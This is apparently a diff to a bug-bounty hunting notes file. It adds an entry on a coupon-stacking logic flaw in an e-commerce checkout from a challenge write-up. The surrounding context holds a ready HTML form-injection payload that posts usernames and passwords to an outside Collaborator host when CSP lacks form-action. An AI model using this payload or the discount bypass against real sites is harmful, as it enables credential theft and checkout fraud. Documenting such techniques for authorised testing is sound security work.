@@ -3760,3 +3760,12 @@ A vulnerability was identified in the Japanese version of the pixiv dictionary w
 - **Hunt signal:** 1) Find reflected HTML injection (even stripped of `<script>`); 2) Check CSP header for missing or permissive `form-action`; 3) Inject `<form action="https://collaborator.net/x"><input name="username"><input name="password"></form><meta http-equiv="refresh" content="0">` and watch Collaborator for credential POST/Referer.
 - **Kill criterion:** Site sets `form-action 'none'` or `form-action 'self'` with no wildcard — submission is blocked and exfil fails.
 - **Evidence:** [PortSwigger Research, 2026-11-11](https://portswigger.net/research/blind-trust-stealing-credentials-through-csp)
+
+---
+
+### Intigriti October 2026 Challenge — Discount Stacking Logic Bypass
+- **Date:** 2026-10-27 · **Source:** [medium.com/@krishnajonnagaddala](https://medium.com/@krishnajonnagaddala/a-666-eur-box-for-66-eur-c420971389a7) · **Class:** writeup
+- **What:** E-commerce checkout compared a new coupon only against the most recent applied promotion — not against the running discount total — letting discount codes stack to 100%, bypassing the price floor entirely.
+- **Why it matters:** Business logic flaw requiring zero technical skill after identification; generalizes to any multi-coupon or multi-discount checkout on any e-commerce target.
+- **Hunt signal:** Apply two distinct discount codes in the same cart and compare final price against each code's stated discount; flag when totals exceed 100% of item value
+- **Evidence:** [medium.com/@krishnajonnagaddala](https://medium.com/@krishnajonnagaddala/a-666-eur-box-for-66-eur-c420971389a7)
